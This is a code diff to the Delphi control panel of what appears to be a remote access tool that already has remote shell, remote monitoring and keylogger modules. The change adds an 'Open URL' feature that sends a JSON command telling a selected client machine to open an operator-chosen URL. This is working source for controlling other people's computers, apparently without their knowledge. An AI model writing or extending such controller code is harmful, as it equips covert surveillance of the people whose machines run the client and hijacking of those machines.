@@ -16,6 +16,7 @@ uses
   UnitRemoteShell,
   UnitRemoteMonitoring,
   UnitKeylogger,
+  UnitOpenURL,
   Vcl.WinXCtrls;
 
 type
@@ -46,6 +47,7 @@ type
     RemoteShell1     : TMenuItem;
     RemoteMonitoring1: TMenuItem;
     Keylogger1       : TMenuItem;
+    OpenURL1         : TMenuItem;
 
     procedure Button1Click(Sender: TObject);
     procedure SendMessage1Click(Sender: TObject);
@@ -58,6 +60,7 @@ type
     procedure RemoteShell1Click(Sender: TObject);
     procedure RemoteMonitoring1Click(Sender: TObject);
     procedure Keylogger1Click(Sender: TObject);
+    procedure OpenURL1Click(Sender: TObject);
   private
     FServerManager: TServerManager;
     FCurrentPort  : Integer;
@@ -74,6 +77,7 @@ type
     procedure AddLog(Category: TLogCategory; const Msg: string);
     procedure EnsureRemoteMonitoringMenuItem;
     procedure EnsureKeyloggerMenuItem;
+    procedure EnsureOpenURLMenuItem;
     function  IsRealClientValue(const Value: string): Boolean;
     function  PreferClientValue(const NewValue, CurrentValue: string): string;
     procedure AddOrUpdateListView(const Info: TClientInfo);
@@ -114,6 +118,7 @@ begin
 
   EnsureRemoteMonitoringMenuItem;
   EnsureKeyloggerMenuItem;
+  EnsureOpenURLMenuItem;
   ListView1.OnMouseDown := ListView1MouseDown;
 end;
 
@@ -196,6 +201,21 @@ begin
   Keylogger1.OnClick := Keylogger1Click;
 end;
 
+procedure TForm1.EnsureOpenURLMenuItem;
+begin
+  if not Assigned(PopupMenu1) then
+    Exit;
+
+  if not Assigned(OpenURL1) then
+  begin
+    OpenURL1         := TMenuItem.Create(PopupMenu1);
+    OpenURL1.Caption := 'Open URL';
+    PopupMenu1.Items.Add(OpenURL1);
+  end;
+
+  OpenURL1.OnClick := OpenURL1Click;
+end;
+
 // ---- Server Initialization ----
 
 procedure TForm1.Button1Click(Sender: TObject);
@@ -259,6 +279,39 @@ begin
     end;
   finally
     Form2.Free;
+  end;
+end;
+
+procedure TForm1.OpenURL1Click(Sender: TObject);
+var
+  SelectedLine: TncLine;
+  LInfo       : TClientInfo;
+  JSONObj     : TJSONObject;
+begin
+  if ListView1.Selected = nil then Exit;
+
+  SelectedLine := TncLine(ListView1.Selected.Data);
+  if SelectedLine = nil then Exit;
+
+  Form8 := TForm8.Create(Self);
+  try
+    if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
+      Form8.Caption := 'Open URL - ' + LInfo.ID;
+
+    if Form8.ShowModal = mrOk then
+    begin
+      JSONObj := TJSONObject.Create;
+      try
+        JSONObj.AddPair('action', 'openurl');
+        JSONObj.AddPair('url',    Form8.Edit1.Text);
+        JSONObj.AddPair('mode',   Form8.ComboBox1.Text);
+        FServerManager.SendJSON(SelectedLine, JSONObj);
+      finally
+        JSONObj.Free;
+      end;
+    end;
+  finally
+    Form8.Free;
   end;
 end;
 
